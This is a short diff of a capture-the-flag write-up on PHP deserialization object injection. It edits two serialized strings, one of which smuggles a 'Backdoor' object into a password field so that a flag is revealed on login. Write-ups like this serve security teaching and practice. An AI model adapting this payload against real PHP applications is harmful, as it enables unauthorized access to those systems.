@@ -183,7 +183,7 @@ O:8:"sessionn":2:{s:7:"*user";s:54:"_🍜__🍜__🍜__🍜__🍜__🍜__🍜__�
 OUTPUT
 
 ```php
-O:8:"sessionn":2:{s:7:"*user";s:54:"***********";s:7:"*pass";s:8:"password**";} //54 characters (count null bytes as well)
+O:8:"sessionn":2:{s:7:"*user";s:54:"*********";s:7:"*pass";s:8:"password";} //54 characters (count null bytes as well)
 ```
 
 This means that we can change the password value to the payload we want by inserting the object in the backdoor class call into the password field instead, which will contain the payload as shown in this image.
@@ -199,7 +199,7 @@ O:8:"sessionn":2:{s:7:"*user";s:54:"_🍜__🍜__🍜__🍜__🍜__🍜__🍜__�
 OUTPUT:
 
 ```php
-O:8:"sessionn":2:{s:7:"*user";s:54:"***********";s:7:"*pass";s:63:"aaaaa**";s:4:"pass";O:8:"Backdoor":1:{s:8:"destruct";s:4:"🍜";}";}
+O:8:"sessionn":2:{s:7:"*user";s:54:"*********";s:7:"*pass";s:63:"aaaaa";s:4:"pass";O:8:"Backdoor":1:{s:8:"destruct";s:4:"🍜";}";}
 ```
 
 You can see that “FLAG” is displayed. Then use our payload to login to the real web page to get the flag.  :) 
